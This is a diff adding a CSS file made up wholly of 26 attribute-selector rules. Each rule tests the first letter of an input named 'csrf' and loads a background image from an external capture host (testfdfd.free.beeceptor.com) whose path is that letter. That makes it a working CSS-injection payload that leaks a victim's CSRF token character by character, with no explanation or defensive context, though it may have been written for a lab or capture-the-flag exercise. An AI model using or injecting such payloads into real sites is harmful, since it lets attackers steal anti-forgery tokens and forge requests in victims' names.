@@ -1,0 +1,103 @@
+input[name=csrf][value^=a] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/a);
+}
+
+input[name=csrf][value^=b] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/b);
+}
+
+input[name=csrf][value^=c] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/c);
+}
+
+input[name=csrf][value^=d] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/d);
+}
+
+input[name=csrf][value^=e] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/e);
+}
+
+input[name=csrf][value^=f] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/f);
+}
+
+input[name=csrf][value^=g] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/g);
+}
+
+input[name=csrf][value^=h] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/h);
+}
+
+input[name=csrf][value^=i] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/i);
+}
+
+input[name=csrf][value^=j] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/j);
+}
+
+input[name=csrf][value^=k] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/k);
+}
+
+input[name=csrf][value^=l] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/l);
+}
+
+input[name=csrf][value^=m] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/m);
+}
+
+input[name=csrf][value^=n] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/n);
+}
+
+input[name=csrf][value^=o] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/o);
+}
+
+input[name=csrf][value^=p] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/p);
+}
+
+input[name=csrf][value^=q] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/q);
+}
+
+input[name=csrf][value^=r] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/r);
+}
+
+input[name=csrf][value^=s] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/s);
+}
+
+input[name=csrf][value^=t] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/t);
+}
+
+input[name=csrf][value^=u] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/u);
+}
+
+input[name=csrf][value^=v] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/v);
+}
+
+input[name=csrf][value^=w] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/w);
+}
+
+input[name=csrf][value^=x] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/x);
+}
+
+input[name=csrf][value^=y] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/y);
+}
+
+input[name=csrf][value^=z] ~ * {
+    background-image: url(https://testfdfd.free.beeceptor.com/z);
+}
